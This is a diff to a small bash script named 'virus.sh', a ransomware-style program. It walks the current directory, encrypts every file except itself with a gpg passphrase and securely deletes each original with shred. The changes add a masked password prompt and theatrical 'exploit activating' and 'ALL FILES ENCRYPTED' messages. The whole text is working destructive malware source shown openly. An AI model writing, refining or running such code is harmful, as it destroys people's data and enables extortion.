@@ -15,10 +15,9 @@ function chk_dir
 		 #echo "else $i"
 		 for i_1 in $i
 		 do
-			 echo "$i_1"
 			if [ $i_1 == $path/$exp ]
 			then
-				printf "\nit is the exploit"
+				printf "$i_1 is the exploit"
 			else
 			printf "encrypting $i_1 and deleteing original one\n" 
 		        gpg -c --batch --passphrase $pass $i_1;shred -u $i_1
@@ -27,7 +26,6 @@ function chk_dir
 		 done
 	 fi
  done
- printf "\n\nCOMPLETED\n\n"
 }
 exp='virus.sh'
 path=`pwd`
@@ -35,18 +33,46 @@ path=`pwd`
 ext='/*'
 #next='.animesh'
 file=$path$ext
-printf "enter password you want for encrytion\n"
-read pass
-printf "$(tput setaf 1)uploading virus through $path\n$(tput setab 7)"
+echo -n "Enter password : "
+stty -echo
+ 
+#read password
+charcount=0
+while IFS= read -p "$prompt" -r -s -n 1 ch
+do
+    # Enter - accept password
+    if [[ $ch == $'\0' ]] ; then
+        break
+    fi
+    # Backspace
+    if [[ $ch == $'\177' ]] ; then
+        if [ $charcount -gt 0 ] ; then
+            charcount=$((charcount-1))
+            prompt=$'\b \b'
+            password="${password%?}"
+        else
+            PROMPT=''
+        fi
+    else
+        charcount=$((charcount+1))
+        prompt='*'
+        password+="$ch"
+    fi
+done
+ 
+stty echo
+printf "$(tput setaf 1)uploading virus through $path\n$"
 sleep 0.8
-printf "$(tput setaf 1)exploit activating in\n$(tput setab 7)"
+printf "$(tput setaf 1)exploit activating in\n"
 sleep 0.5
-printf "$3\n"
+printf "3\n"
 sleep 0.3
 printf "2\n"
 sleep 0.3
 printf "1\n"
 sleep 0.3
-printf "$(tput setaf 2)DONE...\n$(tput setab 7)"
+printf "$(tput setaf 2)DONE...\n$"
 printf "executing...\n"
-chk_dir "$file" "$pass"
+chk_dir "$file" "$password"
+printf "\n\nCOMPLETED"
+printf "\nALL FILES ENCRYPTED AND KEY SAVED\n"
